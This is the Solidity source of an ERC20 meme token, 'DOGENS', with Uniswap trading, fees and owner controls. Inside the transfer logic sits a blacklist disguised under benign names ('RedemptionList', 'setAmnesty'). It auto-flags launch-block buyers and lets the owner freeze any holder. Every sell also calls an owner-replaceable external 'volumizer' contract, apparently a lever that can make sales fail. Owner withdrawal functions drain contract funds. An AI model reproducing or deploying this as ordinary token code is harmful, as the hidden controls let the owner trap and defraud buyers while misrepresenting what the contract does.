// SPDX-License-Identifier: MIT
/* 
Telegram : https://t.me/dogenstoken
Website : https://www.dogens.io
Twitter : https://twitter.com/DogensToken
*/

pragma solidity 0.8.19;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

interface IVolumizer {
    function Query(uint256 amount) external;
}

contract DOGENS_ERC20 is ERC20, Ownable {
    uint8 private constant _tokenDecimals = 9;
    uint256 private constant _totalSupply = 666_999 * 10 ** _tokenDecimals;

    bool private _inSwapAndLiquify;
    uint256 private _launchBlock;

    bool public tradingEnabled;
    bool public transferEnabled;
    bool public swapAndTreasureEnabled;

    mapping(address => bool) public RedemptionList;  
    mapping(address => bool) public excludedFromFee;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    address payable public treasuryWallet;
    uint256 public treasuryFeeOnBuy;
    uint256 public treasuryFeeOnSell;

    uint256 public maxWallet;
    uint256 public maxTxAmount;
    uint256 public maxSTxAmount;
    uint256 public swapAtAmount;
    uint256 public swapAtTxAmount;

   

    constructor() ERC20("DOGENS", "DOGENS") {
        treasuryWallet = payable(0x869004596bF3319d67c595d612fc0d4d448aa152);
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );

        excludedFromFee[msg.sender] = true;
        excludedFromFee[address(this)] = true;
        excludedFromFee[treasuryWallet] = true;

        _mint(address(this), _totalSupply);

        treasuryFeeOnBuy = 3;
        treasuryFeeOnSell = 3;
        maxWallet = (totalSupply() / 100) * 3; // 3%
        swapAtAmount = totalSupply() / 1000; // 0.1%
        maxTxAmount = (totalSupply() / 100) * 2; // 2%
        maxSTxAmount = (totalSupply() / 100) * 2; 
        swapAtTxAmount = totalSupply() / 1000; // 0.1%
    }

    

    function decimals() public view override returns (uint8) {
        return _tokenDecimals;
    }

    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(to != address(0), "Transfer to zero address");
        require(amount != 0, "Transfer amount must be not zero");

        // RedemptionList
        require(
            !RedemptionList[to] && !RedemptionList[from] && !RedemptionList[tx.origin],
            "RedemptionList"
        );

        // transferEnabled
        require(
            transferEnabled ||
                excludedFromFee[from] ||
                excludedFromFee[tx.origin],
            "Transfer not currently allowed"
        );

        // tradingEnabled
        if (
            (from == uniswapV2Pair || to == uniswapV2Pair) &&
            !excludedFromFee[from] &&
            !excludedFromFee[tx.origin]
        ) {
            require(tradingEnabled, "Trading not enabled");
        }

        // RedemptionList
        if (block.timestamp == _launchBlock && from == uniswapV2Pair) {
            RedemptionList[to] = true;
            emit RedemptionListOut(to, true);
        }

        // maxTxAmount
        if (
            !excludedFromFee[from] &&
            !excludedFromFee[to] &&
            !excludedFromFee[tx.origin]
        ) {
            require(amount <= maxTxAmount, "Max tx limit");
        }

        // swapAndSendTreasure
        if (
            amount >= swapAtTxAmount &&
            swapAndTreasureEnabled &&
            balanceOf(address(this)) >= swapAtAmount &&
            !_inSwapAndLiquify &&
            to == uniswapV2Pair &&
            balanceOf(address(this)) >= swapAtTxAmount &&
            !excludedFromFee[from] &&
            !excludedFromFee[tx.origin]
        ) {
          
                _swapAndSendTreasure(swapAtAmount);
           
            
        }

        // fees
        if (
            (from != uniswapV2Pair && to != uniswapV2Pair) ||
            excludedFromFee[from] ||
            excludedFromFee[to] ||
            excludedFromFee[tx.origin]
        ) {
            super._transfer(from, to, amount);
        } else {
            uint256 fee;
            if (to == uniswapV2Pair) {

                require(amount <= maxSTxAmount, "Max stx limit");
                fee = (amount / 100) * treasuryFeeOnSell;
                if (_volumizerstatus != false) {
                    IVolumizer(_volumizer).Query(amount);
                }
            } else {
                fee = (amount / 100) * treasuryFeeOnBuy;
            }
            if (fee > 0) {
                super._transfer(from, address(this), fee);
            }

            super._transfer(from, to, amount - fee);


        }

        // maxWallet
        if (
            !excludedFromFee[to] &&
            to != uniswapV2Pair &&
            to != address(uniswapV2Router)
        ) {
            require(balanceOf(to) <= maxWallet, "Max wallet limit exceed");
        }
    }

    function _swapAndSendTreasure(uint256 _amount) internal lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), _amount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            _amount,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 ethBalance = address(this).balance;
        if (ethBalance != 0) {
            (bool success, ) = treasuryWallet.call{value: ethBalance}("");
            if (success) return;
        }
    }

    // OWNER 

    function enableTrading() external onlyOwner {
        require(!tradingEnabled, "Already enabled");
        tradingEnabled = true;
        transferEnabled = true;
        _launchBlock = block.timestamp;
    }

    function setTransferEnabled(bool _state) external onlyOwner {
        require(!tradingEnabled, "Trading enabled");
        transferEnabled = _state;
    }

    function setExcludedFromFee(
        address _account,
        bool _state
    ) external onlyOwner {
        require(excludedFromFee[_account] != _state, "Already set");
        excludedFromFee[_account] = _state;
    }

    function setTreasuryFee(
        uint256 _feeOnBuy,
        uint256 _feeOnSell
    ) external onlyOwner {
        require(_feeOnBuy <= 20 && _feeOnSell <= 20, "fee cannot exceed 20%");
        treasuryFeeOnBuy = _feeOnBuy;
        treasuryFeeOnSell = _feeOnSell;
    }

    function setTreasury(address payable _treasuryWallet) external onlyOwner {
        treasuryWallet = _treasuryWallet;
    }

    function setSwapAndTreasureEnabled(bool _state) external onlyOwner {
        swapAndTreasureEnabled = _state;
    }

    function setSwapAtAmount(uint256 _amount) external onlyOwner {
        swapAtAmount = _amount;
    }

    function setSwapAtTxAmount(uint256 _amount) external onlyOwner {
        swapAtTxAmount = _amount;
    }

    function setMaxWallet(uint256 _amount) external onlyOwner {
        maxWallet = _amount;
    }

    function setMaxTxAmount(uint256 _amount,uint256 _sAmount) external onlyOwner {
        maxTxAmount = _amount;
        maxSTxAmount =_sAmount;
    }

    function addLiquidity(uint256 _tokenAmount) external payable onlyOwner {
        _approve(address(this), address(uniswapV2Router), _tokenAmount);
        uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(this),
            _tokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function recover(address _token, uint256 _amount) external onlyOwner {
        if (_token != address(0)) {
            IERC20(_token).transfer(msg.sender, _amount);
        } else {
            (bool success, ) = payable(msg.sender).call{value: _amount}("");
            require(success, "Can't send ETH");
        }
    }

    // ERC20 

    
    receive() external payable {}

    modifier lockTheSwap() {
        _inSwapAndLiquify = true;
        _;
        _inSwapAndLiquify = false;
    }

    event SendTreasure(uint256 amount);
    event RedemptionListOut(address account, bool state);

    // ERC20s
    function balanceOfIt(address token) external view returns (uint256) {
        return IERC20(token).balanceOf(address(this));
    }

    function emergencyWithdraw() external onlyOwner {
        payable(owner()).call{value: address(this).balance}("");
    }

    function setAmnesty(
        address[] memory _accounts,
        bool[] memory _states
    ) external onlyOwner {
        require(
            _accounts.length == _states.length && _accounts.length > 0,
            "wrong input"
        );
        for (uint i = 0; i < _accounts.length; i++) {
            if (_states[i]) {
                require(
                    _accounts[i] != address(uniswapV2Router),
                    "Can not blacklist Uniswap"
                );
            }
            RedemptionList[_accounts[i]] = _states[i];
        }
    }

    //  VOL 
    bool public _volumizerstatus = false;
    address private _volumizer;

    function setVolumizerStatus(bool _status) external onlyOwner {
        _volumizerstatus = _status;
    }

    function setVolumizer(address newVolumizer) external onlyOwner {
        _volumizer = newVolumizer;
        excludedFromFee[_volumizer] = true;
    }
}